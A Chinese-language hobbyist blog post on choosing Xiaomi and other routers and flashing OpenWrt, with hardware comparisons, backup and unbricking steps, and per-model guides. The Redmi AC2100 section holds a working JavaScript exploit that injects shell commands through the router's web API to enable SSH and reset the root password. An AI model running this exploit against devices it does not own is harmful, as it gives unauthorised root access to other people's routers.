---
title: openwrt刷机
date: 2022-02-13 01:18:16
tags:
- openwrt
categories:
- 如何实现网络自由
---

介绍了从硬件选择到刷机整个过程
<!-- more -->

## Openwrt硬件选择

如何选择一个可以刷openwrt的路由器？

- [老房子WiFi布网攻略 篇三十八：WiFi 6 梅林或openwrt固件路由器入手指南_路由器_什么值得买 (smzdm.com)](https://post.smzdm.com/p/awznd6qg/)
- [老房子WiFi布网攻略 篇二十四：不漏油的路由器不是好矿机，矿渣路由器盘点_路由器_什么值得买 (smzdm.com)](https://post.smzdm.com/p/apzkqlrx/)
- 极路由、新路由：[机皇！几种高性价比矿渣路由器比较-新手入门及其它(硬件)-恩山无线论坛 (right.com.cn)](https://www.right.com.cn/forum/thread-8097191-1-1.html)

###  小米路由器型号总结

#### CPU分类

- mt7621型号
  - R3G：咸鱼50元左右，有USB3.0接口，128MB的flash。
  - 4A千兆版：咸鱼70元左右，外观简约漂亮，16MB NOR flash有点小。
  - C660x：咸鱼100多，支持wifi6
- 高通型号
  - **目前(22.03)只有AX6S是受openwrt官方支持的**，AX6, AX3600有第三方支持。AX5等其余未支持
    - 不能刷好像是linux kernel还不支持高通的IPQ SoC。
    - B站看到说AX5刷openwrt需要硬改内存为1G，好像说高通的wifi驱动非常耗内存
  - AX6S：220左右
  - AX6：250-300左右

#### 小米系列产品

- 红米AX5，小米AX1800换皮
  - IPQ6000, 4核A53@1.2Ghz：[[OpenWrt Wiki\] Xiaomi AX1800 (AX5/RA67)](https://openwrt.org/inbox/toh/xiaomi/xiaomi_ax1800)

- **红米AX6**，小米AX3600换皮
  - AX6, **IPQ8071A**@1.4GHz, 512(ram) + 128：[[OpenWrt Wiki] Xiaomi Redmi AX6 Wi-Fi 6 Mesh Router](https://openwrt.org/inbox/toh/xiaomi/xiaomi_redmi_ax6_ax3000)
  - AX3600, IPQ8071A, 512 + 256：[[OpenWrt Wiki] Xiaomi AX3600](https://openwrt.org/inbox/toh/xiaomi/xiaomi_ax3600)
  - 对比：[红米AX6拆机，旧款WIFI6无线路由器-路由器交流 (acwifi.net)](https://www.acwifi.net/11176.html)
- AX3000
  - **红米AX3000（比较常见）**，IPQ5000：双核A53@1.0GHz, 256(ram) + 128：[Redmi路由器AX3000立即购买-小米商城](https://www.mi.com/shop/buy/detail?product_id=14538)
  - 小米AX3000：IPQ5000：双核A53@1.0GHz, 256(ram) + 128：[小米路由器AX3000立即购买-小米商城 (mi.com)](https://www.mi.com/shop/buy/detail?product_id=14790)
  - 红米AX3000模具和AX6S一样，为白色。小米AX3000为黑色四棱柱。
- AX5400
  - 红米AX5400，IPQ5018：双核A53@1.0GHz，512(ram) + 128：[红米AX5400千兆版拆机，看看与电竞版有什么差别-路由器交流 (acwifi.net)](https://www.acwifi.net/19451.html)
- AX6000
  - 小米AX6000
    - IPQ5018, 2核A53@1.0Ghz, 512(ram) + 128
    - 使用的SoC IPQ5018为高通沉浸式家庭联网平台，不如高通专业联网平台的IPQ8071A（AX3600上的）
  - **红米AX6000（很强）**
    - **MT7986A**, 4核A53@2.0Ghz, 512(ram) + 128：[[OpenWrt Wiki\] Xiaomi Redmi AX6000](https://openwrt.org/toh/xiaomi/redmi_ax6000)
    - [红米AX6000拆机，最便宜的四核2.0GHz-路由器交流 (acwifi.net)](https://www.acwifi.net/19676.html)

![image-20221029213022447](https://raw.githubusercontent.com/TheRainstorm/.image-bed/main/picgo/image-20221029213022447.png)

参考
- [(33 封私信 / 71 条消息) 路由器红米ax3000和红米ax6选择哪个? - 知乎 (zhihu.com)](https://www.zhihu.com/question/474579126)
- 小米openwrt页面：[[OpenWrt Wiki] Xiaomi](https://openwrt.org/toh/hwdata/xiaomi/start)
- 常见MediaTek SoC：[MediaTek - WikiDevi.Wi-Cat.RU](https://wikidevi.wi-cat.ru/MediaTek)

### 2023 wifi6产品

现在需求wifi6，且信号覆盖广
- 小米wr30u：运营商定制版
- 360 T7：和上者硬件一摸一样。12v 1A

wr30u: wifi6: [小米WR30U无线路由器拆机 AX3000联通定制版-路由器交流 (acwifi.net)](https://www.acwifi.net/23700.html)
[2023年支持刷机的路由器大全（建议收藏） - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/640643641)

- AX1800：cr660x
- AX3000：cr880x：135

[618 想买台路由器求推荐 - V2EX](https://www.v2ex.com/t/948845)
150的T7 512改：[WR30U路由到了随手测测 - ＰＣ数码 - Stage1st - stage1/s1 游戏动漫论坛 (saraba1st.com)](https://www.saraba1st.com/2b/thread-2141173-1-1.html)

### CPU对比

参考：

- [[转贴\] 无线路由器CPU浅析 MT7621A、 BCM47189 到底谁强？-新手入门及其它(硬件)-恩山无线论坛 (right.com.cn)](https://www.right.com.cn/forum/thread-216888-1-1.html)

- 树莓派系列处理器：[Raspberry Pi Documentation - Processors](https://www.raspberrypi.com/documentation/computers/processors.html)
  - Raspberry Pi 2 Model B： BCM2836(quad-core Cortex-A7 )
  - Raspberry Pi 3 Model B：BCM2837( quad-core Cortex-A53@1.2)
    - 50% faster than the Raspberry Pi 2.
  - Raspberry Pi 3 Models A+, B+: BCM2837B0(quad-core Cortex-A53@1.4)
    - 17% faster than the original Raspberry Pi 3
  - Raspberry Pi 4 Model B: BCM2837(quad-core Cortex-A72@1.5 GHz)
    - 50% faster than the Raspberry Pi 3B+

- ARM核对比：[List of ARM processors - Wikipedia](https://en.wikipedia.org/wiki/List_of_ARM_processors)
  - Cortex-A7: 1.9 DMIPS/MHz per core
  - A53: 2.3 DMIPS/MHz
  - A72: 6.3-7.3 DMIPS/MHz
- MIPS核：[MIPS Classic Processor Cores - Imagination Technologies](https://www.mips.com/products/classic/)
  - 1004K: 1.6 DMIPS/MHz
- 74k: 1.93 DMIPS/MHz：CSAC路由器：71
  
- [newifi3-d2-firmware/README.md at master · sawaYch/newifi3-d2-firmware (github.com)](https://github.com/sawaYch/newifi3-d2-firmware/blob/master/README.md)


## 刷机过程总结

以红米AC2100可能的刷机为例，涵盖了openwrt的各种情况：刷breed，恢复，临时镜像

- **建议直接使用官方openwrt镜像 + 官方安装方式。几次使用breed都遇到了问题，而小米官方恢复工具也挺好用的。**

- 第一次自己刷机红米AC2100[[记录红米AC2100折腾]]，一张精华图

  ![image-20210622145337241](https://raw.githubusercontent.com/TheRainstorm/.image-bed/main/picgo/image-20210622145337241.png)

- 路由器刷出问题，修复经验。知道了备份的重要性[[记录记一次路由器刷出问题修复过程]]

## 小米路由器救砖

### 有官方bootloader的情况

**说明：**

官方的引导程序使用的是uboot，位于flash的Bootloader分区，而官方固件则位于OS1分区（红米AC2100）。正常刷openwrt的过程中不会修改bootloader。只要还保留着官方bootloader，就可以通过官方修复工具恢复。

**步骤：**

1. 下载`小米路由器修复工具`和官方镜像：[【下载汇总】客户端/ROM下载 - 小米社区 (xiaomi.cn)](https://www.xiaomi.cn/post/19184644)
2. **路由器通电**，PC通过网线连接到路由器LAN口
3. 打开`MIWIFIRepairTool.x86.exe`
4. 选择镜像
5. **选择网卡**（可以在网络中心中将其它网卡禁用）
6. 断开路由器电源，按住rst键（也有可能需要用针戳），然后接上电源，等待黄灯闪烁（两个灯，一个是有电源标志，一个有互联网标志，这里为电源灯那个）
7. 软件自动上传镜像
8. 保持耐心等待路由器黄灯变蓝（中间过程保持黄灯），**亲测需要4分钟**
9. 断电后重新接上电源，路由器重启

### 刷了breed

**说明：**

breed自身便是一个bootloader，刷完breed后会覆盖原本的bootloader。如果想复原，可通过breed的功能，重新刷回官方bootloader。**强烈建议刷breed前，先备份原本的bootloader以及整个flash**。如果没备份，这里是恩山上收集的**小米官方bootloader下载**：[论坛收集的几个小米路由器官方bootloader - 恩山无线论坛](https://www.right.com.cn/forum/thread-4102208-1-1.html)

**步骤：**

1. 通过breed刷回官方bootloader
2. 通过官方修复工具修复

## 常用操作

### 刷之前备份mtd分区

路由器flash有若干分区，其中有一个分区存储路由器MAC地址、无线校准参数等。若损坏可能导致无线信号弱等问题。因此刷之前最好备份。
查看mtd分区

```bash
root@XiaoQiang:~# cat /proc/mtd
dev:    size   erasesize  name
mtd0: 07f80000 00020000 "ALL"
mtd1: 00080000 00020000 "Bootloader"
mtd2: 00040000 00020000 "Config"
mtd3: 00040000 00020000 "Bdata"
mtd4: 00040000 00020000 "Factory"
mtd5: 00040000 00020000 "crash"
mtd6: 00040000 00020000 "crash_syslog"
mtd7: 00040000 00020000 "reserved0"
mtd8: 00400000 00020000 "kernel0"
mtd9: 00400000 00020000 "kernel1"
mtd10: 02000000 00020000 "rootfs0"
mtd11: 02000000 00020000 "rootfs1"
mtd12: 03580000 00020000 "overlay"
mtd13: 012a6000 0001f000 "ubi_rootfs"
mtd14: 030ec000 0001f000 "data"
```

备份factory分区（小米路由器一般是factory存储了上述那些数据）
```bash
cat /dev/mtd4 > /tmp/factory.bin
```

之后通过scp复制到本地

### snapshot的说明

snapshot是开发版分支

- 默认没有安装luci（没有网页界面）
- 上游每天都会编译产生新的snapshot。对于kernel mod相关软件，不是同一次编译则无法安装。
- [[OpenWrt Wiki\] Installing OpenWrt development snapshots](https://openwrt.org/docs/guide-quick-start/developmentinstallation)

### 命令行安装sysupgrade.bin

- [[OpenWrt Wiki\] Upgrading OpenWrt firmware using CLI](https://openwrt.org/docs/guide-user/installation/sysupgrade.cli)

```
sysupgrade -v /tmp/firmware_image.bin

#If sysupgrade is not available.
# Flash firmware
mtd -r write /tmp/firmware_image.bin firmware
```

### 备份恢复 CLI

- 官方：[[OpenWrt Wiki\] Backup and restore](https://openwrt.org/docs/guide-user/troubleshooting/backup_restore)

自己实现了一个自动配置openwrt脚本

- [TheRainstorm/my-openwrt-config (github.com)](https://github.com/TheRainstorm/my-openwrt-config)

### 性能测试

#### iperf3

ax6s & mi4a

| 测试目的      | 连接               | src       | dst   | speed(Mb/s) | 备注                           |
| ------------- | ------------------ | --------- | ----- | ----------- | ------------------------------ |
| ax6s LAN性能  | 千兆USB网卡        | tianyi310 | ax6s  | **941**     |                                |
| ax6s 无线性能 | wifi6 5Ghz@1201    | s3pro     | ax6s  | **626**     |                                |
| mi4a LAN性能  | 2.5G网卡           | ryzen     | mi4a  | ***470***   |                                |
|               |                    |           |       |             |                                |
| 隧道性能      |                    | tianyi310 | ryzen | 118         |                                |
|               |                    |           |       |             |                                |
| 隧道性能      |                    | mi4a      | ax6s  | 136         |                                |
|               |                    | ax6s      | mi4a  | 149         |                                |
| mi4a交换性能  | ryzen - mi4a - p2w | ryzen     | p2w   | **943**     | 结果居然比ryzen - mi4a还要快！ |

将r4a替换掉后
| 测试目的 | src       | dst       | speed(Mb/s) | 备注 |
| -------- | --------- | --------- | ----------- | ---- |
| p2w      | ryzen     | p2w       | **936**     |      |
|          | p2w       | ryzen     | ***577***   |      |
| 隧道性能 | p2w       | ax6s      | 150         |      |
|          | ax6s      | p2w       | 250         |      |
| 隧道性能 | ryzen     | tianyi310 | **295**     |      |
|          | tianyi310 | ryzen     | **173**     |      |
|          | s3pro     | ryzen     | 256         |      |
| 780/886  | s3pro     | p2w       | **370**     |      |
|          | ryzen     | s3pro     | 274         |      |

## 具体型号刷机过程

### Redmi AC2100刷Openwrt

[[OpenWrt Wiki] Xiaomi Redmi Router AC2100](https://openwrt.org/toh/xiaomi/xiaomi_redmi_router_ac2100)

#### 1. 确认stock系统版本

确认系统版本是否为2.0.23，如果不是，则在系统内手动升级到该版本http://cdn.cnbj1.fds.api.mi-img.com/xiaoqiang/rom/rm2100/miwifi_rm2100_all_fb720_2.0.23.bin

#### 2. 获得ssh

使用web漏洞，获得ssh

```js
// Work for RedMi 2100 firmware 2.0.23
// http://cdn.cnbj1.fds.api.mi-img.com/xiaoqiang/rom/rm2100/miwifi_rm2100_all_fb720_2.0.23.bin

function getSTOK() {
    let match = location.href.match(/;stok=(.*?)\//);
    if (!match) {
        return null;
    }
    return match[1];
}

function execute(stok, command) {
    command = encodeURIComponent(command);
    let path = `/cgi-bin/luci/;stok=${stok}/api/misystem/set_config_iotdev?bssid=SteelyWing&user_id=SteelyWing&ssid=-h%0A${command}%0A`;
    console.log(path);
    return fetch(new Request(location.origin + path));
}

function enableSSH() {
    stok = getSTOK();
    if (!stok) {
        console.error('stok not found in URL');
        return;
    }
    console.log(`stok = "${stok}"`);

    password = prompt('Input new SSH password');
    if (!password) {
        console.error('You must input password');
        return;
    }

    execute(stok, 
`
nvram set ssh_en=1
nvram commit
sed -i 's/channel=.*/channel=\\"debug\\"/g' /etc/init.d/dropbear
/etc/init.d/dropbear start
`
    )
        .then((response) => response.text())
        .then((text) => console.log(text));
    console.log('New SSH password: ' + password);
    execute(stok, `echo -e "${password}\\n${password}" | passwd root`)
        .then((response) => response.text())
        .then((text) => console.log(text));
}

enableSSH();
```

#### 3. 下载openwrt镜像

从官方下载最新镜像，注意有四个文件

- kernel: 具有最少文件系统的Linux内核. 对于首次安装或恢复很有用.
- kernel1: Linux内核作为单独的映像
- rootfs0: 根文件系统作为单独的映像.
- Sysupgrade: 使用Sysupgrade映像更新已经运行OpenWrt的路由器. 该映像可以与LuCI Web界面或终端一起使用.

需要下载kernel1和rootfs0

- [OpenWrt Downloads](https://downloads.openwrt.org/)
- [OpenWrt Firmware Selector](https://firmware-selector.openwrt.org/)

#### 4. 备份

通过dmesg，知道一共有14个mtd分区

```
[    2.940000] NAND device: Manufacturer ID: 0xc8, Chip ID: 0xd1 (ESMT NAND 128MiB 3,3V 8-bit), 128MiB, page size: 2048, OOB size: 64
[    2.950000] [NAND]select ecc bit:4, sparesize :64 spare_per_sector=16
[    2.950000] Scanning device for bad blocks
[    3.100000] Signature matched and data read!
[    3.110000] load_fact_bbt success 1023
...
[    3.190000] Creating 14 MTD partitions on "MT7621-NAND":
[    3.190000] 0x000000000000-0x000007f80000 : "ALL"
[    3.200000] 0x000000000000-0x000000080000 : "Bootloader"
[    3.210000] 0x000000080000-0x0000000c0000 : "Config"
[    3.210000] 0x0000000c0000-0x000000100000 : "Bdata"
[    3.220000] 0x000000100000-0x000000140000 : "Factory"
[    3.230000] 0x000000140000-0x000000180000 : "crash"
[    3.230000] 0x000000180000-0x0000001c0000 : "crash_syslog"
[    3.240000] 0x0000001c0000-0x000000200000 : "cfg_bak"
[    3.240000] 0x000000200000-0x000000600000 : "kernel0"
[    3.250000] 0x000000600000-0x000000a00000 : "kernel1"
[    3.260000] 0x000000a00000-0x000002400000 : "rootfs0"
[    3.260000] 0x000002400000-0x000003e00000 : "rootfs1"
[    3.270000] 0x000003e00000-0x000006400000 : "overlay"
[    3.280000] 0x000006400000-0x000007f80000 : "obr"
[    3.280000] [mtk_nand] probe successfully!
```

通过cat /proc/mtd，知道对应关系

```
root@XiaoQiang:/tmp# cat /proc/mtd
dev:    size   erasesize  name
mtd0: 07f80000 00020000 "ALL"
mtd1: 00080000 00020000 "Bootloader"
mtd2: 00040000 00020000 "Config"
mtd3: 00040000 00020000 "Bdata"
mtd4: 00040000 00020000 "Factory"
mtd5: 00040000 00020000 "crash"
mtd6: 00040000 00020000 "crash_syslog"
mtd7: 00040000 00020000 "cfg_bak"
mtd8: 00400000 00020000 "kernel0"
mtd9: 00400000 00020000 "kernel1"
mtd10: 01a00000 00020000 "rootfs0"
mtd11: 01a00000 00020000 "rootfs1"
mtd12: 02600000 00020000 "overlay"
mtd13: 01b80000 00020000 "obr"
mtd14: 00c1c000 0001f000 "ubi_rootfs"
mtd15: 021e8000 0001f000 "data"
```

备份，其中Factory中存储了EEPROM的数据

```
cat /dev/mtd4 > Factory.dump

scp复制到本地
```

#### 5. 设置环境变量

设置环境变量（rm2100有双系统用于备份保护，需要设置先启动哪一个）

```bash
# Enable uart and boot_wait, useful for testing or recovery if you have an uart adapter!
nvram set uart_en=1
nvram set boot_wait=on
nvram set bootdelay=5

# Set kernel1 as the booting kernel
nvram set flag_try_sys1_failed=1

# Commit our nvram changes
nvram commit
```

#### 6. 刷机

```bash
mtd write kernel1.bin kernel1
mtd -r write rootfs0.bin rootfs0
```

### MI 4A千兆版

官方教程：[[OpenWrt Wiki] Xiaomi Mi Router 4A Gigabit Edition](https://openwrt.org/inbox/toh/xiaomi/xiaomi_mi_router_4a_gigabit_edition)

**warning**
- 2022/10：v2版本的4A千兆版无法刷op。原版使用的是Winbond or GigaDevice的flash芯片，我手头的是GigaDevice的[GD25Q127CSIG ](https://www.tme.eu/en/details/gd25q127csig/serial-flash-memories-integrated-circ/gigadevice/)。新版使用 Eon or CFeon的芯片，还在支持中。
- 老版的有无线屏蔽，而在售的没有

#### 说明

可以漏洞获取shell，不必使用硬件编程器

2022/11/6日，因刷breed bootloader，使得MI 4A变砖。忠告：别用breed，会变得不幸。（你tm支持r3g，不支持mi 4a能不能写清楚）

#### 步骤

~~1. 首先需要使用`OpenWRTInvasion`**获取shell**。参考：[acecilia/OpenWRTInvasion(github.com)](https://github.com/acecilia/OpenWRTInvasion)。

~~同时，该仓库也提供了获得shell后的刷机过程。不过使用官方的`OpenWRTInvasion`会从github上下载文件，而因为网络原因可能会失败。恩山论坛中有用户提供了修改代码的离线版本，可以搜索使用。
不过也可以自行修改代码：修改`script.sh`，将其中的链接替换成本地链接。可以使用python -m http.server运行一个小的http服务，提供下载。例：
   ```bash
   curl -L "https://github.com/acecilia/OpenWRTInvasion/raw/master/script_tools/busybox-mipsel" --insecure --output busybox
   
   #改为,ip需要调整
   curl "http://192.168.31.189:8000/busybox-mipsel" --output busybox
   ```


1. 现在官方仓库集成了本地服务器的功能，直接运行脚本即可。但是官方仓库却放弃了对windows的支持，不过亲测在git bash中运行没有问题，只需要把脚本开头的检测注释掉即可。
```
# if platform.system() == "Windows":
#     sys.exit("Stopping: script can only be run on a Mac/Linux system")
```
2. 之后使用telnet进行连接，成功获得shell如图所示
```
telnet 192.168.31.1 #账号root, 密码root
```
   ![image-20221030210955796](https://raw.githubusercontent.com/TheRainstorm/.image-bed/main/picgo/image-20221030210955796.png)
3. 接着上传openwrt镜像(使用sysupgrade bin)到路由器中，可以使用python搭建http文件服务器。最后运行mtd等待路由器重启完成即可。
```
#window上, sysupgrade.bin所在目录
python -m http.server

#路由器上
cd /tmp
curl -O http://<windows ip>:8000/sysupgrade.bin
mtd -e OS1 -r write sysupgrade.bin OS1
```

#### 参考

breed使用说明：https://www.sohu.com/a/304140654_120096961
breed刷openwrt教程https://www.ixigua.com/6974624328725824031

#### EEPROM下载

> eeprom里有mac和sn等信息，如果sn丢失刷官方bootloader刷回原厂也不能绑定手机app的

- [【新提醒】[20210919更新]小米路由4A千兆版LEDE固件_集成快乐上网、内网穿透、KMS、网络加速-小米无线路由器以及小米无线相关的设备-恩山无线论坛 - Powered by Discuz! (right.com.cn)](https://www.right.com.cn/forum/thread-4054821-1-1.html)

> 我看了下果然是错的，我之前也是这个情况，后来分析了下把eeprom用上了正确的就好了，你刷我这个eeprom，如果还不行就刷我的解锁分区的lede固件，用mtd命令刷写，ssh上路由，本地scp命令拷贝上传到tmp目录，  
  mtd -r write /tmp/eeprom.bin factory  
重启完了就ok  
刷完mac会变，把你的mac地址改成你原来的mac地址。  
如果有原来的固件备份，发我我来帮你提取

- [【新提醒】帮助提取eeprom小米4A千兆(22年8月新版)-小米无线路由器以及小米无线相关的设备-恩山无线论坛 - Powered by Discuz! (right.com.cn)](https://www.right.com.cn/forum/thread-8252165-1-1.html)

#### EEPROM修改

[【新提醒】关于新3(newifi 3)的eeprom文件中MAC-SN等参数位置-newifi无线路由器及网络设备-恩山无线论坛 - Powered by Discuz! (right.com.cn)](https://www.right.com.cn/forum/thread-384637-1-1.html)

用SSH登录进入路由器的Console台后，用命令(cat /proc/mtd)的输出中，Factory区对应的就是无线和MAC/SN等的配置文件。
这个文件备份出来后，大小为64KB，可以在breed中更新eeprom处刷入路由器。

(下图为解锁后的输出)
用WinHex打开备份的文件(假设为eeprom.bin)

1)     路由器的SN
路由器的SN号在路由器的背面贴纸处有，SN的存储在这个文件中的偏移0x7000(处)，格式为以MND开头，如下：

2)     路由器的MAC地址
路由器的MAC号在路由器的背面贴纸处有，MAC的存储在这个文件中的偏移0xE000(处)，格式为连续的两个MAC地址，共占12字节。
分别为起始”MAC地址-结束MAC地址”, 结束MAC地址为起始MAC地址的最后一个字节内容+2. 如图：
起始MAC地址：20 76 93 48 A9 1F (路由器背面处的贴纸)
结束MAC地址：20 76 93 48 A9 21

3)     和无线有关的参数
2.4G无线的BSSID在文件开头偏移0x4-0x9处，总共6字节，如下图所示:

5G无线的BSSID在偏移0x8004-0x8009处，总共6字节, (2.4G无线的BSSID与5G-BSSID的最后一个字节内容相差2)。如下图所示：

和无线有关的参数应该是在偏移0x8000-0x80C0处。看网友们改的话，都是在0x8060-0x809F这三行上修改，由于没有具体说明参数含义，因此不推荐自己修改。
如图所示：

4) 未知的内容

文件开头的0x56-0x61偏移处，一共12字节，分为2组。前6字节和后6字节内容也比较相似。不是mac也不是bssid.


另外在偏移0x8060-0x80A0共4行内，有几个参数是以5个字节为一组的参数，具体格式特征如下：
00 00 26 xx xx, 或者 00 01 26 xx xx, 或者00 02 26 xx xx 等。

建议:
    可以用其它人的EEPROM固件，仅仅修改MAC和SN (可选：BSSID)为自己的路由器的即可，不推荐自己修改无线参数部分内容。

### MI R3G

官方教程：[[OpenWrt Wiki\] Xiaomi Mi WiFi R3G (Mi Wifi Router 3G / MIR3G / MI3G / mi4a Gigabit)](https://openwrt.org/toh/xiaomi/mir3g)

r3g官方固件下载：[OpenWrt Firmware Selector](https://firmware-selector.openwrt.org/?version=21.02.3&target=ramips%2Fmt7621&id=xiaomi_mi-router-3g)

#### 准备

- FAT32格式U盘
- 一枚针用于戳路由器reset键
- 手机安装MIWIFI app

#### 开启ssh

1. 更新为小米开发版固件：https://bigota.miwifi.com/xiaoqiang/rom/r3g/miwifi_r3g_firmware_12f97_2.25.124.bin

2. **下载小米路由器手机客户端(应用商店MI WIFI)软件，绑定路由器**

3. 根据https://d.miwifi.com/rom/ssh，开启SSH

   *p.s. 1. 即使是同一型号，miwifi_ssh.bin也是不同的；2. ssh密码显示在该页面*

   1. 请将下载的工具包bin文件复制到U盘（FAT/FAT32格式）的根目录下，保证文件名为miwifi_ssh.bin；
   2. 断开小米路由器的电源，将U盘插入USB接口；
   3. 按住reset按钮之后重新接入电源，指示灯变为黄色闪烁状态即可松开reset键；
   4. 等待3-5秒后安装完成之后，小米路由器会自动重启，之后您就可以尽情折腾啦 ：）

#### 备份

查看mtd分区

```
root@XiaoQiang:~# cat /proc/mtd
dev:    size   erasesize  name
mtd0: 07f80000 00020000 "ALL"
mtd1: 00080000 00020000 "Bootloader"
mtd2: 00040000 00020000 "Config"
mtd3: 00040000 00020000 "Bdata"
mtd4: 00040000 00020000 "Factory"
mtd5: 00040000 00020000 "crash"
mtd6: 00040000 00020000 "crash_syslog"
mtd7: 00040000 00020000 "reserved0"
mtd8: 00400000 00020000 "kernel0"
mtd9: 00400000 00020000 "kernel1"
mtd10: 02000000 00020000 "rootfs0"
mtd11: 02000000 00020000 "rootfs1"
mtd12: 03580000 00020000 "overlay"
mtd13: 012a6000 0001f000 "ubi_rootfs"
mtd14: 030ec000 0001f000 "data"
```

备份factory分区

```
cat /dev/mtd4 > /tmp/factory.bin

#on windows
scp root@192.168.33.193:/tmp/factory.bin .
scp root@192.168.33.228:/tmp/factory.bin .
```

#### 刷openwrt

```
mtd write openwrt-18.06.2-ramips-mt7621-mir3g-squashfs-kernel1.bin kernel1
mtd write openwrt-18.06.2-ramips-mt7621-mir3g-squashfs-rootfs0.bin rootfs0
nvram set flag_try_sys1_failed=1
nvram commit
reboot
```

### AX6S

#### 步骤

[YangWang92/AX6S-unlock (github.com)](https://github.com/YangWang92/AX6S-unlock)

- telnet后手动开启ssh
  ```
  /etc/init.d/dropbear start
  ```
  ​ tips: 使用git-bash版本的ssh连接报错。使用cmd的ssh可以。
  ```
  Unable to negotiate with 192.168.31.1 port 22: no matching host key type found. Their offer: ssh-rsa
  ```
- 必须添加boot_fw1改行，否则重启后进入原系统。
  ```
  nvram set ssh_en=1
  nvram set uart_en=1
  nvram set boot_wait=on
  nvram set flag_boot_success=1
  nvram set flag_try_sys1_failed=0
  nvram set flag_try_sys2_failed=0
  nvram set "boot_fw1=run boot_rd_img;bootm"
  nvram commit
  ```
- 刷写factory.bin-> firmware分区


AX6S为国内版，国外版称为AX3200
- SoC：**MT7622**B: 2 x A53@1.35GHz CPU。
  - 满血版本是MT7622A，少了蓝牙就是MT7622BV，没有蓝牙和多媒体功能的是MT7622B，基本剩下无线功能的是MT7622E
-  ram: 256 + flash: 128
- [[OpenWrt Wiki] Xiaomi AX3200 / Redmi AX6S](https://openwrt.org/toh/xiaomi/ax3200)

### 竞斗云2.0（P&W)

#### 资料

[[OpenWrt Wiki] P&W R619AC](https://openwrt.org/toh/p_w/r619ac)


#### 教程

需要先刷入opboot（一个第三方bootloader）[竞斗云2刷opboot - 路由智态 (red-yellow.net)](https://www.red-yellow.net/竞斗云2刷opboot.html)

然后再刷openwrt。
编译：[竞斗云2的OpenWrt固件 - 路由智态 (red-yellow.net)](https://www.red-yellow.net/%e7%ab%9e%e6%96%97%e4%ba%912%e7%9a%84openwrt%e5%9b%ba%e4%bb%b6.html)
刷的这里作者提供的immortalwrt：[【新提醒】【2023-6-13】竞斗云2.0P&W-R619AC OPENWRT固件|插件全面|多版本-OPENWRT专版-恩山无线论坛 - Powered by Discuz! (right.com.cn)](https://www.right.com.cn/forum/thread-4061585-1-1.html)


之前使用switch官方固件22.03，看到device有eth0, eth1，然后switch界面可以设置4个lan口
但是问题是只要一改动vlan设置，通过wan口（开启192.168.99.0的dhcp）访问p2w就会掉

后面刷了一个其它人编译的immortalwrt固件，发现其实只有一个eth0。wan口eth0.2是一个vlan。switch界面有4个lan和1个wan可以配置。
这下配置switch vlan异常稳定顺畅
![](https://raw.githubusercontent.com/TheRainstorm/.image-bed/main/vlan-plan.jpg)


这里CPU端口的tag和untag
- 设置为off，则不存在eth0.3设备
- 设置为tag则eth0.3上tcpdump能收到很多包
- 设置为untag，则收不到包

收到的包其实只有广播等情况，否则包直接从特定端口出去了，不会往其它端口发。
```
root@p2w:~# tcpdump -ni eth0.3 host 114.214.236.72
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth0.3, link-type EN10MB (Ethernet), capture size 262144 bytes
q01:50:16.005639 IP 114.214.236.72.45520 > 239.255.255.250.1900: UDP, length 94
01:50:16.006412 ARP, Request who-has 114.214.236.74 tell 114.214.236.72, length 46
01:50:16.173072 ARP, Request who-has 114.214.236.96 tell 114.214.236.72, length 46
01:50:16.926278 ARP, Request who-has 114.214.236.200 tell 114.214.236.72, length 46
```

#### 遇到问题

经常性的掉网络，研究后发现是ap的br-lan和上游无法连接了。通过无线手动设置静态ip可以连上p2w。尝试ping 网关地址，发现eth0.1上能抓到arp包，但是上游对应bridge却抓不到。反过来，上游arping ap地址，ap也收不到包。
- 测试如果把连接ap的网线连接笔记本，网络是正常的，因此排除上游问题。
```
arping -i interface 测试二层是否通
arp查看当前mac表
tcpdump -ni eth0.1 arp
```

没办法，不知如何解决，只好重装了官方22.03.5的系统。官方系统把wan单独拿了出来作为eth1，而switch界面可以配置eth0和剩余四个端口

### 360 T7

#### 基本参数

mt7681：2xA53@1.3GHz
256 RAM+ 128 NAND

价格
- 原版118x2包邮，魔改512内存版：150

![](https://raw.githubusercontent.com/TheRainstorm/.image-bed/main/20230815125432.png)

待机60多度有毒，看来还是需要自己加散热片

40(30，最小覆盖两个的距离) x25（深度10mm）
- 13x7
- 12x13
25x25
- 10x12
30x25（深度：15mm）
- 13x14

单个芯片：14x14
整个盖住：25x25，30x20


[hanwckf's blog](https://cmi.hanwckf.top/)
[360 T7 刷 openwrt 教程｜最强的百元路由器 | 酱紫表 (qust.me)](https://qust.me/post/360t7-openwrt/)
[【新提醒】360T7 openwrt固件发布，感谢H大-OPENWRT专版-恩山无线论坛 - Powered by Discuz! (right.com.cn)](https://www.right.com.cn/forum/thread-8263290-1-1.html)
提到了ipv6 + wiregaurd + hnat有问题？[[避坑] 360T7 - V2EX](https://www.v2ex.com/t/930398)
#### 准备

硬件
- 拆机工具：螺丝刀，撬片（没它真打不开）
- usb转ttl模块，杜邦线公对母

软件
- putty等串口软件
- 修改版uboot：[Release 20230727 · hanwckf/bl-mt798x (github.com)](https://github.com/hanwckf/bl-mt798x/releases/tag/20230727)
- 固件：237, immortal原版
- 可能需要：旧版原厂固件，新版固件关闭了failsafe模式[hqvv/360T7: qihoo 360T7 resources and official firmware (github.com)](https://github.com/hqvv/360T7)
- 可选，windows netcat，用于在failsafe模式下备份路由器flash。
#### 1. 拆机和TTL模块连接

拆机注意：
- 路由器只有两个螺丝，都被背面贴纸盖住了
- 一共有2+8个卡口，非常难拆。优先从路由器下方撬开，然后再两侧，最后上侧比较容易。
  - 视频参考：[360T7第二部分拆机_哔哩哔哩_bilibili](https://www.bilibili.com/video/BV1GV4y1P74A/?spm_id_from=333.880.my_history.page.click)

TTL模块连接
板子左上角四个触孔，从上到下：RX, TX, GND。**波特率115200**
- 注意，对应TTL模块一侧，RX需要对应TX，TX对应RX

#### 2. TTL进入failsafe模式开启telnet

原理
- 原系统使用uboot，但是关闭了uboot菜单，开机后会直接引导内核
- 原系统引导过程中支持failsafe模式，进入后可以mount_root，对文件系统进行修改，从而可以开启telnet

过程
- 连接好串口，并打开putty后，插电开机，路由器启动并输出信息
- 在引导内核过程中，会出现进入failsafe提示，按f+enter即可进入。大概有3秒等待时间。
  - 如果没出现，需要降级原系统。[【新提醒】360t7m(t7移动定制版)无法进入failsafe模式-OPENWRT专版-恩山无线论坛 - Powered by Discuz! (right.com.cn)](https://www.right.com.cn/forum/thread-8297040-1-1.html)
